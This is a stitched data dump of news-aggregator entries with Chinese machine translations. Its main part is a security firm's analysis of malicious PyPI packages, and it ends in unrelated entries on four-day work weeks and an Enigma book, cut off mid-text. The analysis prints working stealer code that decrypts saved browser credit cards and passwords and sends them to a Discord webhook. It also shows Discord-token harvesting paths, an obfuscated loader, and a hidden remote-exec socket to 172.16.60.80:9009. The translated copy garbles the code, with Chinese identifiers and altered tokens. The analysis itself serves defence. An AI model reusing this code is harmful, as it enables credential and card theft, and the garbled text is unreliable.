Generator\uff09\u6709\u6548\u8f7d\u8377\u3002\u8fd9\u662f\u4e00\u4e2a\u4ece\u672a\u516c\u5f00\u53d1\u5e03\u7684\u751f\u6210\u5668\u5de5\u5177\uff0c\u4f46\u6709\u6548\u8f7d\u8377\uff08\u4e2a\u6027\u5316\u4ee4\u724c\u6293\u53d6\u5668\uff09\u662f\u516c\u5f00\u5171\u4eab\u7684\uff0c\u5e76\u4e14\u4e00\u4e9b\u793a\u4f8b\u4e5f\u4e0a\u4f20\u5230\u4e86 Github\u3002 Discord \u8eab\u4efd\u9a8c\u8bc1\u4ee4\u724c\u7a83\u53d6\u5668\u4ee3\u7801\u975e\u5e38\u7b80\u5355\uff0c\u5b83\u8fed\u4ee3\u4e00\u7ec4\u786c\u7f16\u7801\u7684\u8def\u5f84\uff1a local = os.getenv(&#39;LOCALAPPDATA&#39;) roaming = os.getenv(&#39;APPDATA&#39;) paths = { &#39;Discord&#39;: roaming + &#39;\\\\ Discord&#39;, &#39;Discord Canary&#39;: \u6f2b\u6e38 + &#39;\\\\discordcanary&#39;, &#39;Discord PTB&#39;: \u6f2b\u6e38 + &#39;\\\\discordptb&#39;, &#39;Google Chrome&#39;: \u672c\u5730 + &#39;\\\\Google\\\\Chrome\\\\User Data\\\\Default &#39;, &#39;Opera&#39;: \u6f2b\u6e38 + &#39;\\\\Opera Software\\\\Opera Stable&#39;, &#39;Brave&#39;: \u672c\u5730 + &#39;\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default&#39;, &#39;Yandex&#39;: \u672c\u5730 + &#39; \\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default&#39; } \u7136\u540e\u7b80\u5355\u5730\u8bfb\u53d6\u8fd9\u4e9b\u8def\u5f84\u4e0b\u7684\u6240\u6709 .log \u548c .ldb \u6587\u4ef6\uff08\u7279\u522b\u662f\u5728 Local Sotrage\\leveldb \u4e0b\uff09\u5e76\u67e5\u627e Discord \u8eab\u4efd\u9a8c\u8bc1\u4ee4\u724c\uff0c\u5982\u4e0b\u6240\u793a\uff1aAhDDanSZFkkf2j2J8co2d5Tn .G2rsTL.ZP2E7xR3AiapA8oNmgyqsao0Fj1\uff08\u5355\u56e0\u7d20\u4ee4\u724c \u2013 24 \u4e2a\u5b57\u7b26 + &#39;.&#39; + 6 \u4e2a\u5b57\u7b26 + &#39;.&#39; + 27 \u4e2a\u5b57\u7b26\uff09\n\u7ed3\u679c\u901a\u8fc7 Webhook\uff08\u4e00\u79cd\u5c06\u81ea\u52a8\u6d88\u606f\u548c\u6570\u636e\u66f4\u65b0\u53d1\u9001\u5230\u79c1\u4eba\u670d\u52a1\u5668\u4e0a\u7684\u6587\u672c\u901a\u9053\u7684\u7b80\u5355\u65b9\u6cd5\uff09\u4e0a\u4f20\u5230 Discord\uff0c\u53c2\u6570\u5982\u4e0b\uff1a{ &quot;type&quot;: 1, &quot;id&quot;: &quot;807327703082074143&quot;, &quot;name&quot;: &quot;Captain Hook&quot;, &quot;avatar&quot;: null, &quot;channel_id&quot;: &quot;725001140324008047&quot;, &quot;guild_id&quot;: &quot;720931953251057725&quot;, &quot;application_id&quot;: null, &quot;token&quot;: &quot;uwAgm3PQUNDQvCdvChpx7vCvCvFxpgsvCvCvCvCypgsvCypgsvCypz8047&quot;\u8d35\u65cf\u5bb6\u65cf\u7684\u7b2c\u4e8c\u4e2a\u6709\u6548\u8f7d\u8377\u662f\u201c\u81ea\u52a8\u5b8c\u6210\u201d\u4fe1\u606f\u7a83\u53d6\u5668\u3002\u6240\u6709\u73b0\u4ee3\u6d4f\u89c8\u5668\u90fd\u652f\u6301\u4e3a\u7528\u6237\u4fdd\u5b58\u5bc6\u7801\u548c\u4fe1\u7528\u5361\u4fe1\u606f\uff1a\u8fd9\u5f88\u65b9\u4fbf\uff0c\u4f46\u7f3a\u70b9\u662f\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u88ab\u8bbf\u95ee\u200b\u200b\u672c\u5730\u673a\u5668\u7684\u6076\u610f\u8f6f\u4ef6\u6cc4\u9732\u3002 def cs(): master_key = master() login_db = os.environ[&#39;USERPROFILE&#39;] + os.sep + \\r&#39;AppData\\Local\\Google\\Chrome\\User Data\\default\\Web Data&#39;shutil.copy2(login_db, &quot;CCvault.db&quot;) conn = sqlite3.connect(&quot;CCvault.db&quot;) cursor = conn.cursor() try: cursor.execute(&quot;SELECT * FROM credit_cards&quot;) for r in cursor.fetchall(): username = r [1]encrypted_pa\u200b\u200bssword=r[4]decrypted_pa\u200b\u200bssword=dpw(encrypted_pa\u200b\u200bssword,master_key)expire_mon=r[2]expire_year=r[3]hook.send(f&quot;CARD-NAME:&quot;+\u7528\u6237\u540d+&quot;\\nNUMBER:&quot;+decrypted_pa\u200b\u200bssword + &quot;\\nEXPIRY M: &quot; + str(expire_mon) + &quot;\\nEXPIRY Y: &quot; + str(expire_year) + &quot;\\n&quot; + &quot;*&quot; * 10 + &quot;\\n&quot;) login_db = os.environ[&#39;USERPROFILE&#39; ] + os.sep + r&#39;\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data&#39; ... cursor.execute(&quot;SELECT action_url, username_value, password_value FROM logins&quot;)decrypted_pa\u200b\u200bssword = dpw(encrypted_pa\u200b\u200bssword, master_key) \u5982\u679c\u7528\u6237\u540d != &quot;&quot; \u6216 encrypted_pa\u200b\u200bssword != &quot;&quot;: hook.send(f&quot;URL: &quot; + url + &quot;\\nUSER: &quot; + username + &quot;\\nPASSWORD: &quot; + encrypted_p assword + &quot;\\n&quot; + &quot;*&quot; * 10 + &quot;\\n&quot;) \u8d35\u65cf\u5bb6\u65cf\u7684\u7b2c\u4e09\u4e2apayload\u6536\u96c6\u53d7\u5bb3\u8005\u7cfb\u7edf\u7684\u4ee5\u4e0b\u4fe1\u606f\uff0c\u5e76\u5c06\u5176\u4e0a\u4f20\u5230\u63d0\u5230\u7684Webhook\uff1a\n\u5728\u201c\u4f7f pytagora \u5b9a\u7406\u53d8\u5f97\u5bb9\u6613\u201d\uff08\u539f\u6587\u5982\u6b64\uff09\u7684\u6709\u8da3\u4f2a\u88c5\u4e0b\uff0c\u8fd9\u662f\u5305\u7684\u5168\u90e8\u4ee3\u7801\uff1a import math import base64,sys def hello(): exec(base64.b64decode(&#39;aW1wb3J0IHNvY2tldCxzdHJ1Y3Qs...&#39;)) def hypotenuse (a,b): hello() c = math.sqrt(math.pow(a,2) + math.pow(b,2)) return round(c,2) def other(c,x): y = math.sqrt(math.pow(c,2)-math.pow(x,2)) return round(y,2) import socket,struct,time s=socket.socket(2,socket.socket.socket.SOCK_STREAM ) s.connect((&#39;172.16.60.80&#39;,9009)) l=struct.unpack(&#39;&gt;I&#39;,s.recv(4))[0] \u6253\u5370 (l) d=s.recv(l) \u6253\u5370 ( d) while len(d)&gt;!1: d+=s.recv(l-len(d)) print (d) exec(d,{&#39;s&#39;:s}) \u7b80\u800c\u8a00\u4e4b\u2014\u2014\u6076\u610f\u8f6f\u4ef6\u8bd5\u56fe\u8fde\u63a5\u5230TCP \u7aef\u53e3 9009 \u4e0a\u7684\u79c1\u6709 IP \u5730\u5740\uff0c\u7136\u540e\u6267\u884c\u4ece\u5957\u63a5\u5b57\u8bfb\u53d6\u7684\u4efb\u4f55 Python \u4ee3\u7801\u3002\u5982\u679c\u5728\u68c0\u67e5\u60a8\u7684 PyPI \u4f9d\u8d56\u9879\u540e\uff0c\u60a8\u786e\u5b9a\u5df2\u7ecf\u5728\u672c\u5730\u5b89\u88c5\u4e86 noblesse\uff08\u6216\u5176\u4efb\u4f55\u514b\u9686\uff09\uff0c\u6211\u4eec\u5efa\u8bae\uff1a \u68c0\u67e5 Edge \u4e2d\u4fdd\u5b58\u4e86\u54ea\u4e9b\u5bc6\u7801\uff0c\u5e76\u5728\u6bcf\u4e2a\u76f8\u5e94\u7684\u7f51\u7ad9\uff08\u52a0\u4e0a\u4efb\u4f55\u91cd\u590d\u4f7f\u7528\u8fd9\u4e9b\u5bc6\u7801\u7684\u7f51\u7ad9\uff09\u3002\u53ef\u4ee5\u901a\u8fc7\u6253\u5f00 Edge \u5e76\u5bfc\u822a\u5230 edge://settings/passwords \u6765\u6267\u884c\u68c0\u67e5\u3002\u4fdd\u5b58\u7684\u5bc6\u7801\uff08\u53ef\u80fd\u5df2\u88ab\u6cc4\u9732\uff09\u7684\u5b8c\u6574\u5217\u8868\u53ef\u4ee5\u5728\u201c\u4fdd\u5b58\u7684\u5bc6\u7801\u201d\u4e0b\u67e5\u770b\u3002\u68c0\u67e5 Chrome \u4e2d\u4fdd\u5b58\u4e86\u54ea\u4e9b\u4fe1\u7528\u5361\u5e76\u8003\u8651\u53d6\u6d88\u8fd9\u4e9b\u4fe1\u7528\u5361\u3002\u53ef\u4ee5\u901a\u8fc7\u6253\u5f00 Chrome \u5e76\u5bfc\u822a\u5230 chrome://settings/payments \u6765\u6267\u884c\u68c0\u67e5\u3002\u5df2\u4fdd\u5b58\u7684\u4fe1\u7528\u5361\uff08\u53ef\u80fd\u5df2\u88ab\u76d7\u7528\uff09\u7684\u5b8c\u6574\u5217\u8868\u53ef\u5728\u4ed8\u6b3e\u65b9\u5f0f\u4e0b\u67e5\u770b\u3002\n\u5982\u679c\u60a8\u786e\u5b9a pytagora\uff08\u6216\u5176\u4efb\u4f55\u514b\u9686\uff09\u5df2\u672c\u5730\u5b89\u88c5\u5728\u60a8\u7684\u673a\u5668\u4e0a\uff0c\u800c\u60a8\u4e0d\u592a\u53ef\u80fd\u611f\u67d3\u6076\u610f\u8f6f\u4ef6\uff0c\u6211\u4eec\u5efa\u8bae\u60a8\u9075\u5faa\u901a\u5e38\u7684\u6076\u610f\u8f6f\u4ef6\u68c0\u67e5\u6b65\u9aa4\uff0c\u4f8b\u5982\u4f7f\u7528\u5df2\u5b89\u88c5\u7684 Anti \u8fd0\u884c\u5b8c\u6574\u626b\u63cf- \u75c5\u6bd2\u8f6f\u4ef6\u3002\u6b63\u5982\u6211\u4eec\u5728\u4e4b\u524d\u7684 PyPI \u7814\u7a76\u4e2d\u4e5f\u770b\u5230\u7684\uff0c\u516c\u5171\u8f6f\u4ef6\u5b58\u50a8\u5e93\u4e2d\u7f3a\u4e4f\u8282\u5236\u548c\u81ea\u52a8\u5316\u5b89\u5168\u63a7\u5236\uff0c\u5373\u4f7f\u662f\u6ca1\u6709\u7ecf\u9a8c\u7684\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u5c06\u5b83\u4eec\u7528\u4f5c\u4f20\u64ad\u6076\u610f\u8f6f\u4ef6\u7684\u5e73\u53f0\uff0c\u65e0\u8bba\u662f\u901a\u8fc7\u57df\u540d\u62a2\u6ce8\u3001\u4f9d\u8d56\u6df7\u6dc6\u8fd8\u662f\u7b80\u5355\u7684\u793e\u4f1a\u5de5\u7a0b\u653b\u51fb\u3002\u672c\u7814\u7a76\u4e2d\u5206\u6790\u7684\u51e0\u4e4e\u6240\u6709\u4ee3\u7801\u7247\u6bb5\u90fd\u57fa\u4e8e\u5df2\u77e5\u7684\u516c\u5171\u5de5\u5177\uff0c\u4ec5\u66f4\u6539\u4e86\u5c11\u6570\u53c2\u6570\u3002\u6df7\u6dc6\u4e5f\u662f\u57fa\u4e8e\u516c\u5171\u6df7\u6dc6\u5668\u3002\u6211\u4eec\u5e0c\u671b\u770b\u5230\u66f4\u591a\u8fd9\u4e9b\u201c\u5f17\u5170\u80af\u65af\u5766\u201d\u6076\u610f\u8f6f\u4ef6\u5305\u4ece\u4e0d\u540c\u7684\u653b\u51fb\u5de5\u5177\u62fc\u63a5\u800c\u6210\uff08\u5177\u6709\u66f4\u6539\u7684\u6e17\u6f0f\u53c2\u6570\uff09\u3002\u6211\u4eec\u5c06\u7ee7\u7eed\u76d1\u63a7\u516c\u5171\u8f6f\u4ef6\u5305\u5b58\u50a8\u5e93\u4ee5\u6e05\u7406\u6b64\u7c7b\u5b9e\u4f8b\u3002\u6700\u540e\uff0c\u6211\u4eec\u8981\u611f\u8c22 Dustin Ingram (@di_codes) \u5feb\u901f\u54cd\u5e94\u5e76\u5220\u9664\u6076\u610f\u8f6f\u4ef6\u5305\u3002", "note_en": "Software package repositories are becoming a popular target for supply chain attacks. Recently, there has been news about malware attacks on popular repositories like npm, PyPI, and RubyGems. Developers are blindly trusting repositories and installing packages from these sources, assuming they are secure. Sometimes malware packages are allowed to be uploaded to the package repository, giving malicious actors the opportunity to use repositories to distribute viruses and launch successful attacks on both developer and CI/CD machines in the pipeline.\n As part of an ongoing effort by the JFrog security research team (formerly Vdoo) to automatically identify malicious packages, we are now reporting several Python packages hosted on PyPI as malicious. We have alerted PyPI about the existence of the malicious packages which promptly removed them. Based on data from  pepy.tech, we estimate the malicious packages were downloaded about 30,000 times. We currently don\u2019t have data about the actual impact caused by the use of these malicious packages.\n In this blog post, we will share the technical analysis of these packages and their impact.\n     All of the above packages (and most novice Python malware) use a simple obfuscation technique of:\n   import base64, codecs\rmagic = &#39;aW1wb3J0IGNvbG9yYW1hLCBkYXRldGltZS...&#39;\rlove = &#39;0iLKOcY3L4Y2q1nJkxpl97nJE9Y2EyoTI0M...&#39;\rgod = &#39;a2luZy5hcHBlbmQodG9rZW4pDQogICAgICAg...&#39;\rdestiny = &#39;yxIKAVDaAQK3xjpQWkqRAboUcBIzqjEmS...&#39;\rjoy = &#39;\\x72\\x6f\\x74\\x31\\x33&#39;\rtrust = eval(&#39;\\x6d\\x61\\x67\\x69\\x63&#39;) + eval(&#39;\\x63\\x6f\\x64\\x65\\x63\\x73\\x2e\\x64...&#39;)\reval(compile(base64.b64decode(eval(&#39;\\x74\\x72\\x75\\x73\\x74&#39;)),&#39;&#39;,&#39;exec&#39;))\n  This obfuscation can trick a simple static analysis tool, but doesn\u2019t stand against a more thorough analysis, and actually raises a red flag that will make many researchers take a closer look at this code.\n The specific (Nordic metal inspired?) strings used in the obfuscated code helped us to realize that the malware was simply processed with the public tool  python-obfuscator.\n The packages aryi and suffer were obfuscated using  PyArmor, suggesting that malware developers are experimenting with different obfuscation methods.\n  The first payload of the  noblesse \u201cfamily\u201d of malwares is stealing Discord authentication tokens. An authentication token allows the attacker to impersonate the user that originally held the token (similar to HTTP session cookies).\n The payload stealing the tokens is based on the infamous  dTGPG (Discord Token Grabber Payload Generator) payload. This is a generator tool that was never released publicly, but the payloads (the individualized token grabbers) are shared publicly, and some examples were also uploaded to  Github.\n The Discord auth token stealer code is extremely simple, it iterates a hardcoded set of paths:\n local = os.getenv(&#39;LOCALAPPDATA&#39;)\rroaming = os.getenv(&#39;APPDATA&#39;)\r\rpaths = {\r &#39;Discord&#39;: roaming + &#39;\\\\Discord&#39;,\r &#39;Discord Canary&#39;: roaming + &#39;\\\\discordcanary&#39;,\r &#39;Discord PTB&#39;: roaming + &#39;\\\\discordptb&#39;,\r &#39;Google Chrome&#39;: local + &#39;\\\\Google\\\\Chrome\\\\User Data\\\\Default&#39;,\r &#39;Opera&#39;: roaming + &#39;\\\\Opera Software\\\\Opera Stable&#39;,\r &#39;Brave&#39;: local + &#39;\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default&#39;,\r &#39;Yandex&#39;: local + &#39;\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default&#39;\r}\n and then simply reads all  .log and  .ldb files under these paths (specifically under Local  Sotrage\\leveldb) and looks for Discord authentication tokens, which looks like this:\n AhDDanSZFkkf2j2J8co2d5Tn.G2rsTL.ZP2E7xR3AiapA8oNmgyqsao0Fj1 (Single-factor token \u2013 24 chars + \u2018.\u2019 + 6 chars + \u2018.\u2019 + 27 chars)\n The results are uploaded to Discord via a Webhook (an easy way to get automated messages and data updates sent to a text channel on a private server) with the  following parameters:\n {\r &#34;type&#34;: 1,\r &#34;id&#34;: &#34;807327703082074143&#34;,\r &#34;name&#34;: &#34;Captain Hook&#34;,\r &#34;avatar&#34;: null,\r &#34;channel_id&#34;: &#34;725001140324008047&#34;,\r &#34;guild_id&#34;: &#34;720931953251057725&#34;,\r &#34;application_id&#34;: null,\r &#34;token&#34;: &#34;uwAgm7PQaROJB3USUNDv1RT7uJzfidUsHBsC_y0p2qtChlzNVgpG1vw2zAtkFX-8Xq-x&#34;\r}\n  The second payload of the  noblesse family is an \u201cAutocomplete\u201d information stealer. All modern browsers support saving passwords and credit card information for the user:\n  This is very convenient, but the downside is that this information can be leaked by malicious software that got access to the local machine.\n  def cs():\r master_key = master()\r login_db = os.environ[&#39;USERPROFILE&#39;] + os.sep + \\\r r&#39;AppData\\Local\\Google\\Chrome\\User Data\\default\\Web Data&#39;\r shutil.copy2(login_db,\r &#34;CCvault.db&#34;)\r conn = sqlite3.connect(&#34;CCvault.db&#34;)\r cursor = conn.cursor()\r\r try:\r cursor.execute(&#34;SELECT * FROM credit_cards&#34;)\r for r in cursor.fetchall():\r username = r[1]\r encrypted_password = r[4]\r decrypted_password = dpw(\r encrypted_password, master_key)\r expire_mon = r[2]\r expire_year = r[3]\r hook.send(f&#34;CARD-NAME: &#34; + username + &#34;\\nNUMBER: &#34; + decrypted_password + &#34;\\nEXPIRY M: &#34; + str(expire_mon) + &#34;\\nEXPIRY Y: &#34; + str(expire_year) + &#34;\\n&#34; + &#34;*&#34; * 10 + &#34;\\n&#34;)\n  login_db = os.environ[&#39;USERPROFILE&#39;] + os.sep + r&#39;\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data&#39;\r...\rcursor.execute(&#34;SELECT action_url, username_value, password_value FROM logins&#34;)\rdecrypted_password = dpw(encrypted_password, master_key)\rif username != &#34;&#34; or decrypted_password != &#34;&#34;:\r\thook.send(f&#34;URL: &#34; + url + &#34;\\nUSER: &#34; + username + &#34;\\nPASSWORD: &#34; + decrypted_password + &#34;\\n&#34; + &#34;*&#34; * 10 + &#34;\\n&#34;)\n   The third payload of the  noblesse family gathers the following information about the victim\u2019s system, and uploads it to the mentioned Webhook:\n    Under the interesting pretense of \u201cMake pytagora theorem easy\u201d (sic) this is the entirety of the package\u2019s code:\n import math\rimport base64,sys\rdef hello():\r\texec(base64.b64decode(&#39;aW1wb3J0IHNvY2tldCxzdHJ1Y3Qs...&#39;))\rdef hypotenuse(a,b):\r\thello()\r\tc = math.sqrt(math.pow(a,2) + math.pow(b,2))\r\treturn round(c,2)\rdef other(c,x):\r\ty = math.sqrt(math.pow(c,2)-math.pow(x,2))\r\treturn round(y,2)\n  import socket,struct,time\rs=socket.socket(2,socket.socket.socket.SOCK_STREAM)\rs.connect((&#39;172.16.60.80&#39;,9009))\rl=struct.unpack(&#39;&gt;I&#39;,s.recv(4))[0]\rprint (l)\rd=s.recv(l)\rprint (d)\rwhile len(d)&gt;!1:\rd+=s.recv(l-len(d))\rprint (d)\rexec(d,{&#39;s&#39;:s})\n To be succinct \u2013 the malware tries to connect to a private IP address on TCP port 9009, and then execute whatever Python code is read from the socket.\n   \u200bIf, after checking your PyPI dependencies, you have identified that  noblesse (or any of its clones) has been locally installed, we suggest:\n \u200bChecking which passwords were saved in  Edge, and changing these compromised passwords in each respective website (plus any websites where these passwords were reused).The check can be performed by opening  Edge and navigating to  edge://settings/passwords. The full list of saved passwords (which were potentially compromised) can be seen under  Saved passwords.\n Checking which credit cards were saved in  Chrome and consider canceling these credit cards.The check can be performed by opening  Chrome and navigating to chrome://settings/payments. The full list of saved credit cards (which were potentially compromised) can be seen under  Payment methods.\n \u200bIf you have identified that  pytagora (or any of its clones) has been locally installed on your machine, while unlikely that you were infected with malware, we suggest following the usual malware checking steps, such as running a full scan with your installed Anti-Virus software.\n  As we have also seen in our  previous PyPI research, lack of moderation and automated security controls in public software repositories allow even inexperienced attackers to use them as a platform to spread malware, whether through typosquatting, dependency confusion, or simple social engineering attacks.\n Almost all of the code snippets analyzed in this research were based on known public tools, with only a few parameters changed. The obfuscation was also based on public obfuscators.\n We expect to see more of these \u201cFrankenstein\u201d malware packages stitched from different attack tools (with changed exfiltration parameters). We will continue to monitor public package repositories to sanitize such instances.\n Finally, we\u2019d like to thank Dustin Ingram ( @di_codes), for quickly responding and removing the malicious packages.", "posttime": "2021-08-05 20:55:10", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u4ee3\u7801,pypi,quot", "title": "\u6076\u610f PyPI \u5305\u7a83\u53d6\u4fe1\u7528\u5361\u5e76\u6ce8\u5165\u4ee3\u7801", "title_en": "Malicious PyPI packages stealing credit cards and injecting code", "transed": 1, "url": "https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/", "via": "", "real_tags": ["\u4ee3\u7801", "pypi", "quot"]}, {"category": "", "categoryclass": "", "imagename": "5b3cbebc5694beb2bc8b683b018b4a1c.png", "infoid": 1071338, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5bfb\u627e\u5177\u6709\u66f4\u597d\u5de5\u4f5c\u4e0e\u751f\u6d3b\u5e73\u8861\u7684\u8fdc\u7a0b\u7f16\u7a0b\u5de5\u4f5c\u7684\u5730\u65b9\u3002\u6211\u4eec\u53ea\u5217\u51fa\u6bcf\u5468 4 \u5929\u5de5\u4f5c\u5236\u3001\u517c\u804c\u548c\u5de5\u4f5c\u65f6\u95f4\u7075\u6d3b\u7684\u5de5\u4f5c\u3002", "note_en": "The place to find remote programming jobs with a better work-life balance. We only list 4 day work week, part time and jobs with flexible hours.", "posttime": "2021-08-05 20:54:54", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u79d1\u6280,companies", "title": "\u6bcf\u5468\u5de5\u4f5c\u56db\u5929\u7684\u79d1\u6280\u516c\u53f8", "title_en": "Tech Companies with Four-Day Work Weeks", "transed": 1, "url": "https://4dayweek.io/blog/10-tech-companies-with-4-day-work-weeks-2021", "via": "", "real_tags": ["\u79d1\u6280", "companies"]}, {"category": "", "categoryclass": "", "imagename": "dcd58deb7f8a20e2b126329f43c58999.jpg", "infoid": 1071337, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "X\u3001Y \u548c Z\uff1aEnigma \u5982\u4f55\u7834\u89e3\u7684\u771f\u5b9e\u6545\u4e8b Dermot Turing The History Press (2018) Alan Turing \u5728\u7b2c\u4e8c\u6b21\u4e16\u754c\u5927\u6218\u4e2d\u5bf9\u5fb7\u56fd\u4fe1\u606f\u7684\u5173\u952e\u89e3\u8bfb\u662f\u5bc6\u7801\u7834\u8bd1\u7684\u7edd\u6d3b\u3002\u4ece 1940 \u5e74\u8d77\uff0c\u56fe\u7075\u548c\u4ed6\u7684\u56e2\u961f\u8bbe\u8ba1\u4e86\u6570\u767e\u53f0\u7535\u5b50\u673a\u5668\uff0c\u79f0\u4e3a\u70b8\u5f39\uff0c\u53ef\u4ee5\u89e3\u5bc6\u654c\u65b9\u6307\u6325\u5b98\u6bcf\u5929\u53d1\u9001\u7684\u6570\u5343\u5c01\u4fe1\u4ef6\uff0c\u4ee5\u6307\u5bfc\u4ed6\u4eec\u7684\u58eb\u5175\u3002\u8fd9\u79cd\u77e5\u8bc6\u7684\u6d2a\u6d41\u7f29\u77ed\u4e86\u6218\u4e89\u3002\u82f1\u56fd\u5e03\u83b1\u5207\u5229\u516c\u56ed\u2014\u2014\u8fd9\u4e00\u5207\u53d1\u751f\u7684\u79d8\u5bc6\u4e2d\u5fc3\u2014\u2014\u7406\u6240\u5f53\u7136\u5730\u5728\u5386\u53f2\u4e0a\u5360\u6709\u4e00\u5e2d\u4e4b\u5730\u3002\u4f46\u4e0e\u6240\u6709\u7a81\u7834\u4e00\u6837\uff0c\u66f4\u591a\u7684\u4eba\u5960\u5b9a\u4e86\u57fa\u7840\u3002\u4f1f\u5927\u6570\u5b66\u5bb6\u7684\u4f84\u5b50\u5fb7\u83ab\u7279\u00b7\u56fe\u7075 (Dermot Turing) \u5728\u4ed6\u7684\u8457\u4f5c X\u3001Y \u548c Z \u4e2d\u8bb2\u8ff0\u4e86\u4e00\u7fa4\u6ce2\u5170\u6570\u5b66\u5bb6\u7684\u6263\u4eba\u5fc3\u5f26\u7684\u6545\u4e8b\uff0c\u4ed6\u4eec\u6bd4\u827e\u4f26\u00b7\u56fe\u7075 (Alan Turing) \u65e9\u4e86\u5f88\u591a\u5e74\uff0c\u4ed6\u4eec\u5bf9\u5fb7\u56fd Enigma \u7f16\u7801\u673a\u5668\u7684\u8fd0\u4f5c\u65b9\u5f0f\u6709\u4e86\u5f88\u591a\u4e86\u89e3\u3002\u5728\u7b2c\u4e8c\u6b21\u4e16\u754c\u5927\u6218\u4e4b\u524d\u548c\u671f\u95f4\uff0c\u6ce2\u5170\u4eba\u4e0e\u6cd5\u56fd\u548c\u82f1\u56fd\u7684\u60c5\u62a5\u90e8\u95e8\u5206\u4eab\u4e86\u4ed6\u4eec\u7684\u79d8\u5bc6\u2014\u2014\u5b57\u6bcd X\u3001Y \u548c Z \u5206\u522b\u662f\u6cd5\u56fd\u3001\u82f1\u56fd\u548c\u6ce2\u5170\u5bc6\u7801\u7834\u8bd1\u5c0f\u7ec4\u7684\u7b80\u5199\u3002\u4f5c\u8005\u7684\u7814\u7a76\u5f88\u8f9b\u82e6\u3002\u6218\u540e\uff0c\u519b\u4e8b\u6587\u4ef6\u6563\u843d\u5728\u6b27\u6d32\u5404\u5730\uff0c\u6cd5\u56fd\u7684\u5173\u952e\u8bb0\u5f55\u4ec5\u5728 2016 \u5e74\u624d\u88ab\u89e3\u5bc6\u3002\u8bb8\u591a\u539f\u59cb\u6ce2\u5170\u6587\u4ef6\u88ab\u9500\u6bc1\uff0c\u4f46\u6570\u5b66\u5bb6\u7684\u5bb6\u4eba\u5171\u4eab\u4e86\u79c1\u4eba\u4fe1\u4ef6\u3002\u56fe\u7075\u63ed\u793a\u4e86\u4e00\u4e2a\u5173\u4e8e\u667a\u6167\u3001\u52c7\u6562\u548c\u53cb\u60c5\u7684\u975e\u51e1\u6545\u4e8b\uff0c\u8bfb\u8d77\u6765\u5c31\u50cf\u4e00\u672c\u6263\u4eba\u5fc3\u5f26\u200b\u200b\u7684\u95f4\u8c0d\u5c0f\u8bf4\u3002\u5728 1920 \u5e74\u7684\u4fc4\u6ce2\u6218\u4e89\u671f\u95f4\uff0c\u6ce2\u5170\u4eba\u5728\u5bc6\u7801\u5b66\u548c\u65e0\u7ebf\u7535\u5de5\u7a0b\u65b9\u9762\u7684\u6280\u80fd\u6c47\u805a\u5728\u4e00\u8d77\u3002\u4fe1\u53f7\u5458\u89e3\u7801\u4e86\u6765\u81ea\u7ea2\u519b\u519b\u4e8b\u6307\u6325\u5b98\u7ea6\u745f\u592b\u00b7\u65af\u5927\u6797\u7684\u4e00\u5c01\u7535\u62a5\uff0c\u8fd9\u8868\u660e\u5bf9\u534e\u6c99\u7684\u653b\u51fb\u8feb\u5728\u7709\u776b\u3002\u5e72\u6270\u4fc4\u7f57\u65af\u4eba\u7684\u65e0\u7ebf\u7535\u901a\u8baf\u4e3a\u4fdd\u536b\u548c\u62ef\u6551\u8fd9\u5ea7\u57ce\u5e02\u8d62\u5f97\u4e86\u8db3\u591f\u7684\u65f6\u95f4\u3002 Maksymilian Ci\u0119\u017cki \u548c Antoni Palluth \u662f\u8fd9\u4e9b\u4fe1\u53f7\u5458\u4e4b\u4e00\u3002 1920 \u5e74\u51b2\u7a81\u540e\uff0cCi\u0119\u017cki \u6210\u4e3a\u65e0\u7ebf\u7535\u60c5\u62a5\u90e8\u95e8\u7684\u8d1f\u8d23\u4eba\u3002 Palluth \u521b\u529e\u4e86\u4e00\u5bb6\u7535\u5b50\u8bbe\u5907\u516c\u53f8\uff0c\u5176\u4e2d\u5305\u62ec\u4e3a\u6ce2\u5170\u7279\u5de5\u63d0\u4f9b\u4fe1\u7528\u5361\u5927\u5c0f\u7684\u6536\u97f3\u673a\u3002 1926 \u5e74\uff0c\u5fb7\u56fd\u6d77\u519b\u5f00\u59cb\u4ee5\u66f4\u968f\u673a\u7684\u65b9\u5f0f\u53d1\u9001\u4fe1\u606f\uff0c\u8fd9\u4f7f\u5f97\u5b83\u4eec\u51e0\u4e4e\u65e0\u6cd5\u7834\u8bd1\u3002\u5b83\u4eec\u662f\u4f7f\u7528\u7c7b\u4f3c\u6253\u5b57\u673a\u7684 Enigma \u673a\u5668\u7f16\u7801\u7684\u3002\u952e\u76d8\u662f\u8fde\u7ebf\u7684\uff0c\u6240\u4ee5\u8f93\u5165\u4e00\u4e2a\u5b57\u6bcd\u4f1a\u70b9\u4eae\u9876\u90e8\u7684\u4e00\u7ec4\u706f\u6ce1\u4e2d\u7684\u53e6\u4e00\u4e2a\u5b57\u6bcd\u3002\u6bcf\u4e00\u6b21\u51fb\u952e\uff0c\u8f6c\u5b50\u90fd\u4f1a\u6539\u53d8\u7535\u8def\u7684\u8def\u5f84\u3002\u8fd9\u4e9b\u673a\u5668\u662f\u5546\u4e1a\u4e0a\u53ef\u7528\u7684\uff0c\u4f46\u7ecf\u8fc7\u4fee\u6539\u4ee5\u4f9b\u5fb7\u56fd\u519b\u4e8b\u4f7f\u7528\u3002\u5982\u679c\u4e0d\u77e5\u9053\u673a\u5668\u7684\u7cbe\u786e\u8bbe\u7f6e\uff0c\u5c31\u65e0\u6cd5\u89e3\u5f00\u4ee3\u7801\u3002\u8fd9\u672c\u4e66\u8bb2\u8ff0\u4e86 Ci\u0119\u017cki 